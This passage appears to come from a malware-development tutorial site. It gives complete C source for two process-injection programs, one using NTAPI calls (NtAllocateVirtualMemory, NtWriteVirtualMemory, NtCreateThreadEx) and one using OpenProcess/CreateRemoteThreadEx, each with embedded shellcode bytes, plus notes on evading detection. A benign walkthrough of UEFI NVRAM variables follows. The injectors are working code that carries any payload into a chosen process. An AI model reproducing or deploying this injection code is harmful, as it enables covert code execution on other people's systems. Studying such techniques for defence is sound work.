(NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); After getting the address of ntdll, we get the address of NtOpenProcess from ntdll with GetProcAddress and give this address to the NtOpenProcess structure we created in the project.\nHANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); Finally, we call NtOpenProcess. But before that we define the OBJECT_ATTRIBUTES and CLIENT_ID structures.\nNote that while in OpenProcess the PID value is given directly with a DWORD, NtOpenProcess does not take the PID value directly and gives it to UniqueProcess, which is the first element of CLIENT_ID and of type HANDLE.\nLet‚Äôs keep an eye on the if condition in this section. Compared to user mode WinAPIs, NTAPIs that return results of type NTSTATUS, if it returns 0, it indicates success. Therefore, if the condition returns a value other than 0, we print the error status on the screen.\nInstead of running the program directly and seeing the result, let‚Äôs analyze it in more detail and see what is happening in the background. Let‚Äôs give Windbg the .exe file we coded:\nAfter pressing the Debug button, let‚Äôs put a bp in the main function and run it:\nLet‚Äôs activate View \u003e Dissassembly from the top of Windbg and take a look at the disassembly of the main function:\nWhen looking at the main function, we can start by looking at the address of the ntdll we got with GetModuleHandeW. Let‚Äôs add a bp after GetModuleHandleW runs and see what value rax gets:\nAfter GetModuleHandleW runs, we can verify that rax points to the start address of ntdll.dll.\nOur next section will be to get the address of the NtOpenProcess with GetProcAddress:\nIn the same way, let‚Äôs add a bp in the section after GetProcAddress runs and take a look at the value rax gets:\nAs we can see, the execution of GetProcAddress yields the address 00007ffc7c6dfbd0 and when we check the address we can see that it is NtOpenProcess in ntdll.\nNow let‚Äôs finally turn our focus to the point where we call NtOpenProcess:\nIn this section we can see that the parameters for NtOpenProcess are prepared and then it calls NtOpenProcess. However, I want you to notice one thing: the parameters are prepared upside down. If you look at the symbol names, you will see that first the CID structure is prepared and given to the r9 register and finally the address of the HandleProcess is given to the rcx register.\nWIN32 APIs like OpenProcess use stdcall calling conventions. For a better understanding we can use the Microsoft Learn documentation:\nThe¬†__stdcall¬†calling convention is used to call Win32 API functions. The callee cleans the stack, so the compiler makes¬†vararg¬†functions¬†__cdecl. Functions that use this calling convention require a function prototype. The¬†__stdcall¬†modifier is Microsoft-specific.\nSince WIN32 APIs use the stdcall calling convention, parameters are prepared from right to left:\nLet‚Äôs go back to our C code for a better understanding:\nNTSTATUS Status = NtOpenProcessAddress( \u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID ); Although this is how we prepare the parameters of NtOpenProcess in the project, since OpenProcess is included in the stdcall rule, these parameters will be prepared from right to left in the background. So it is like this:\nNTSTATUS Status = NtOpenProcessAddress( \u0026CID, \u0026ObjAttr, PROCESS_ALL_ACCESS, \u0026HandleProcess ); Again, you will see that registers such as r9 are prepared while preparing the parameters. These registers are not used randomly, again it is related to the x64 Calling Convention of Windows:\nBy default, the x64 calling convention passes the first four arguments to a function in registers. The registers used for these arguments depend on the position and type of the argument. Remaining arguments get pushed on the stack in right-to-left order. All arguments passed on the stack are 8-byte aligned.\nThe first four parameters of the function are passed to registers rcx, rdx, r8 and r9. If there are more than four parameters, the others are passed to the stack. If we turn to NtOpenProcess for a better understanding, it will be prepared as shown below:\nNTSTATUS Status = NtOpenProcessAddress( \u0026HandleProcess, // rcx PROCESS_ALL_ACCESS, // rdx \u0026ObjAttr, // r8 \u0026CID // r9 ); We can also verify this if we look at the Disassembly screen again:\nLet‚Äôs add a bp in main where we call NtOpenProcess and continue the program with p to see what NtOpenProcess returns:\nNtOpenProcess returned 0 after running. Let‚Äôs remember what I said: Native APIs that return NTSTATUS type indicate success if they return 0.\nLet‚Äôs make a diagram of the operations we did in the project:\nIf you remember from the first diagram, our first section was kernel32.dll, but in our project we skip this part and reach directly NtOpenProcess from ntdll.dll in the program.\nInjecting Shellcode with NTAPI Now we know what we are doing in the NTAPI Injection technique. We will do the same steps as we did in our Shellcode Execution documentation, but differently we will use NTAPI.\nFirst, let‚Äôs create utils.h header in the project and paste the following codes:\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e #pragma once #define STATUS_SUCCESS (NTSTATUS)0x00000000L #pragma region STRUCTURES typedef struct _OBJECT_ATTRIBUTES { ULONG Length; VOID* RootDirectory; struct _UNICODE_STRING* ObjectName; ULONG Attributes; VOID* SecurityDescriptor; VOID* SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _PS_ATTRIBUTE { ULONGLONG Attribute; SIZE_T Size; union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* fn_NtOpenProcess) ( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory) ( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory) ( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx) ( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtWaitForSingleObject) ( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); typedef NTSTATUS(NTAPI* fn_NtClose) ( IN HANDLE Handle ); #pragma endregion Ve main.c projesini kodlayalƒ±m:\n#include \"utils.h\" /* cmd.exe /K \"echo NTAPI Injection with bekoo\" */ char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x4e\\x54\\x41\\x50\\x49\\x20\\x49\\x6e\\x6a\\x65\" \"\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\\x20\\x62\\x65\\x6b\" \"\\x6f\\x6f\\x22\\x00\"; size_t ShellcodeSize = sizeof(Shellcode); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\injection.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; HMODULE ntDLL = NULL; PVOID RemoteBuffer = NULL; size_t bytesWritten = 0; OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = STATUS_SUCCESS; /* Get handle to ntdll and kernel32 */ ntDLL = GetModuleHandleA(\"ntdll.dll\"); if (ntDLL == NULL) { printf(\"Failed to get handle for NTDLL! Error Code: 0x%lx\\n\", GetLastError()); return -1; } /* NtCloseHandle */ fn_NtClose ntClose = (fn_NtClose)GetProcAddress(ntDLL, \"NtClose\"); /* NTOpenProcess */ fn_NtOpenProcess ntOpenProcess = (fn_NtOpenProcess)GetProcAddress(ntDLL, \"NtOpenProcess\"); Status = ntOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026objAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"Failed to open handle to Process! Error Code: 0x%lx\", Status); return -1; } /* NTAllocateVirtualMemory */ fn_NtAllocateVirtualMemory ntAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntDLL, \"NtAllocateVirtualMemory\"); Status = ntAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"Failed to Allocate Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NTWriteVirtualMemory */ fn_NtWriteVirtualMemory ntWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntDLL, \"NtWriteVirtualMemory\"); Status = ntWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), \u0026bytesWritten); if (Status != STATUS_SUCCESS || bytesWritten != sizeof(Shellcode)) { printf(\"Failed to Write Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtCreateThreadEx */ fn_NtCreateThreadEx ntCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntDLL, \"NtCreateThreadEx\"); Status = ntCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, \u0026objAttr, HandleProcess, (RemoteBuffer), NULL, FALSE, 0, 0, 0, 0); if (Status != STATUS_SUCCESS) { printf(\"Failed to create Thread! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtWaitForSingleObject */ fn_NtWaitForSingleObject ntWaitForSingleObject = (fn_NtWaitForSingleObject)GetProcAddress(ntDLL, \"NtWaitForSingleObject\"); Status = ntWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"Failed to wait for Thread! Error Code: 0x%lx\", Status); ntClose(HandleThread); ntClose(HandleProcess); return -1; } ntClose(HandleThread); ntClose(HandleProcess); return 0; } Here‚Äôs result:\nConclusion In this documentation we have looked closely at NTAPIs, we have theoretically introduced the User-mode and Kernel-mode fields, and then we have worked on NTAPIs and finally we executed Shellcode using NTAPIs."},"title":"NTAPI Injection"},"/docs/malware-dev/shellcode-injection/":{"data":{"":"","#":" Introduction In this documentation, we will discuss Shellcode Injection Technique.\nWhat is a Process? In simple terms, a process is a unit of work created by the operating system to run a program. If a program is started‚Äîeither by a user or by the operating system‚Äîit is first loaded into memory. Then, the operating system creates a process to execute it. The memory space for the loaded program is managed by this process, and the program‚Äôs instructions start running.\nAny program you see in a graphical interface is just a set of files (essentially, program code) sitting on disk. As long as it‚Äôs not running, it‚Äôs inactive. When you launch it, the code is first loaded from disk into memory, and then execution begins. At this point, the program becomes active.\nWhat is a Thread? A process, in the simplest sense, is a running program. Inside a process, there can be one or more threads. A thread is the smallest unit of execution that the operating system schedules on the CPU. Any thread in a process can run any part of the program‚Äôs code‚Äîeven parts that other threads are also running.\nCompared to processes, threads are lighter and faster. A process can contain multiple threads, allowing it to perform multiple tasks at the same time.\nFor example, think of a web browser. One thread might handle user interactions with the interface, while other threads load web pages in the background. This way, the browser can respond to clicks while still loading content at the same time. Here‚Äôs a thread list from task manager:\nWhat is Shellcode Injection? Shellcode Execution is often associated with process injection techniques. After injecting shellcode into the memory of a target process, an attacker can gain control over the target system by having it executed. This execution is typically triggered through mechanisms such as remote thread creation, thread hijacking, or asynchronous procedure calls (APCs).\nTo evade detection, attackers often obfuscate their shellcode using encryption or encoding schemes, making it harder for signature-based scanners to identify malicious payloads. They may also manipulate memory permissions, marking regions as non-executable until just before execution, or use indirect execution techniques like return-oriented programming (ROP) to bypass control flow integrity checks.\nCoding Here‚Äôs a simple code:\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e /* cmd /K \"echo Shellcode Injection with bekoo\" */ char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\" \"\\x49\\x6e\\x6a\\x65\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\" \"\\x20\\x62\\x65\\x6b\\x6f\\x6f\\x22\\x00\"; int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } if (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Now let‚Äôs take a look at this code one by one. Firstly, the shellcode in the project is a shellcode that opens cmd.exe and prints ‚ÄúShellcode Injection with bekoo‚Äù on the screen. We will inject this shellcode into the target process.\nint main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; ... We first check the argc variable in main. This variable holds the number of arguments given during the execution of the program. If argc is less than 2, we print the correct usage of the program to the screen and return the program with -1.\nThen we create the variables needed to run the malware:\nPID: This variable holds the PID of the target process. HandleProcess: This variable is used to hold the handle of the target process. HandleThread: This variable is used to hold the handle of the thread to be created in the target process. RemoteBuffer: This variable is used to hold the address of the shellcode to be created in the target process. HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } In this section, we get the handle of the target process. So you can think of it as accessing the target program. If we can‚Äôt get the handle of the target process, we print an error message and return the program with -1.\nRemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } Then we reserve a space in the memory of the target process to hold the shellcode. If this fails, we print an error message and return the program with -1.\nif (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } In this section, we write the shellcode into the memory of the target process. If this fails, we print an error message and return the program with -1.\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } In this section, we create a new thread in the target process. This thread will execute the shellcode in the memory of the target process. If this fails, we print an error message and return the program with -1.\nFinally, we wait for the thread we created via WaitForSingleObject to finish and then release the handles of the target process.\nConclusion In this documentation, we‚Äôve explored the fundamentals of processes and threads, clarified the concept of shellcode, and demonstrated how injection works‚Äîstep by step‚Äîthrough a practical example.\nBy injecting shellcode into a remote process and executing it via CreateRemoteThreadEx, attackers can achieve arbitrary code execution while masquerading as trusted software. However, this technique is not only popular among offensive security professionals but also serves as an important learning tool for defenders to understand how exploitation works under the hood."},"title":"Shellcode Injection"},"/docs/uefi-dev/":{"data":{"":"You can check the following sections to review documentations related to UEFI Development:\nUEFI to Windows Communication via NVRAM Variables\rSimple UEFI Keylogger\rIntroduction to UEFI"},"title":"UEFI Development"},"/docs/uefi-dev/communation-between-windows-and-uefi/":{"data":{"":"","#":"In this documentation, we will discuss how to establish communication between a UEFI driver and a Windows driver. Specifically, we‚Äôll explore how to use NVRAM-based UEFI variables to exchange data between the two environments.\nWhat is NVRAM? NVRAM (Non-Volatile RAM) is a key component in UEFI-based systems, used to store persistent configuration and system state data. Unlike regular RAM, NVRAM retains its contents across reboots and power-offs, making it essential for managing firmware-level settings.\nIn UEFI, NVRAM is organized into variables‚Äîstructured key-value pairs that include metadata (attributes) defining how and when they can be accessed. These variables are used for critical system functions such as boot management, secure boot key storage, hardware configuration, and OEM-specific settings.\nUEFI Variables UEFI Variables¬†is specified with a combination of a GUID and Unicode String. The GUID of a variable can prevent name collisions between different vendors.\nThe Boot Manager Chapter¬†of UEFI Specification defines the EFIGLOBAL_VARIABLE_GUID, also known¬†gEfiGlobalVariableGuid¬†in EDK II. If we want to use a global variable, such as SecureBoot Status in our UEFI Driver, we need to benefit from the gEfiGlobalVariableGuid. Here are some global variable list from¬†EDK II Repo:\nEFI_PLATFORM_LANG_CODES_VARIABLE_NAME L\"PlatformLangCodes\" EFI_BOOT_CURRENT_VARIABLE_NAME L\"BootCurrent\" EFI_SIGNATURE_SUPPORT_NAME L\"SignatureSupport\" [‚Ä¶]\nEach UEFI Variable has attributes that the describe visibility persistence. Here‚Äôs list of the attributes:\nBOOTSERVICE_ACCESS The variable has permissions for write and read access at the pre-boot before¬†ExitBootServices()¬†called, which means that the variable is not available after called ExitBootServices() and the contents of the variable will be deleted on the next system reset.\nBOOTSERVICE_ACCESS | RUNTIME_ACCESS The variable has permissions for write and read access before ExitBootServices() called, but its contents will remain as¬†read-only¬†when ExitBootServices() called, also the contents will be deleted on the next system reboot.\nNON_VOLATILE | BOOTSERVICE_ACCESS The variable has permissions for write and read access before ExitBootServices() called and its contents are persistent through system reset.\nNON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS The variable has permissions for write and read in both pre-boot and OS Runtime environment. Its contents are persistent through system reset.\nAccess UEFI Variables with Services When a UEFI Driver store configuration information via UEFI Variables, it can access them with services provided by¬†EFI_HII_CONFIG_ACCESS_PROTOCOL¬†The Services¬†SetVariable()¬†and¬†GetVariable()¬†are used to set and get configuration information. We will see these two services through the article.\n1 - SetVariable() SetVariable()¬†service sets the contents of the variable, also it can be used to create a new variable, modify the variable or to delete an existing variable. Here are parameters of the service:\ntypedef EFI_STATUS SetVariable ( IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, IN UINT32 Attributes, IN UINTN DataSize, IN VOID *Data ); Let‚Äôs create a project for¬†SetVariable:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"MyUEFIVar\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; UINT8 ContentOfVariable[4] = { 0xDE, 0xAD, 0xBE, 0xEF }; UINTN DataSize = sizeof(ContentOfVariable); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eSetVariable( VariableName, \u0026VendorGuid, Attributes, DataSize, \u0026ContentOfVariable ); if (EFI_ERROR(Status)) { Print(L\"Write Operation Failed!\\n\"); return Status; } Print(L\"The content successfully written!\\n\"); return EFI_SUCCESS; } In the code, we wrote the content of ContentOfVariable. Firstly, we created a variable name, GUID and values for UEFI Variable, then we executed the SetVariable. As a result of these processes, our UEFI Variable has these information:\nUEFI Variable Name:¬†MyUEFIVar GUID:¬†A1B2C3D4-1234-5678-9ABC-DEF123456789 Content:¬†0xDEADBEEF Here‚Äôs result:\nNow we can access it with these information.\n2 - GetVariable() GetVariable()¬†service get content of the variable. Here are parameters of the service:\ntypedef EFI_STATUS GetVariable ( IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, OUT UINT32 *Attributes OPTIONAL, IN OUT UINTN *DataSize, OUT VOID *Data OPTIONAL ); Now let‚Äôs develop the project with GetVariable service:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"MyUEFIVar\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; UINT8 ContentOfVariable[4] = { 0xDE, 0xAD, 0xBE, 0xEF }; UINTN DataSize = sizeof(ContentOfVariable); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eSetVariable( VariableName, \u0026VendorGuid, Attributes, DataSize, \u0026ContentOfVariable ); if (EFI_ERROR(Status)) { Print(L\"Failed to write!\\n\"); return Status; } Print(L\"The content successfully written!\\n\"); UINT8 Content[4] = { 0 }; DataSize = sizeof(Content); Status = gRT-\u003eGetVariable( VariableName, \u0026VendorGuid, \u0026Attributes, \u0026DataSize, \u0026Content ); if (EFI_ERROR(Status)) { Print(L\"Failed to read the variable!\\n\"); return Status; } for (int x = 0; x \u003c DataSize; x++) { Print(L\"Content: 0x%02x\\n\", Content[x]); } return EFI_SUCCESS; } After¬†SetVariable¬†called, we called GetVariable service to get content of the our UEFI Variable, then we printed the result. Here‚Äôs the result:\nAnd now we can focus on our Windows Driver.\nCoding Windows Driver Essentially there‚Äôs a routine which we can use for our purpose in ntoskrnl.¬†ExGetFirmwareEnvironmentVariable¬†can be used to read UEFI Variables. So coding of the windows driver will not be difficult. We can call this routine with UEFI Variable information:\n#include \u003cntddk.h\u003e NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrint(\"Driver unloaded.\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; UNICODE_STRING VariableName = RTL_CONSTANT_STRING(L\"MyUEFIVar\"); UINT8 Content[4] = { 0 }; ULONG BufferSize = sizeof(Content); GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; NTSTATUS Status = STATUS_SUCCESS; Status = ExGetFirmwareEnvironmentVariable(\u0026VariableName, \u0026VendorGuid, \u0026Content, \u0026BufferSize, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Read Data!\\n\"); return Status; } for (ULONG x = 0; x \u003c BufferSize; x++) { DbgPrintEx(0, 0, \"The value from UEFI Variable: 0x%02x\\n\", 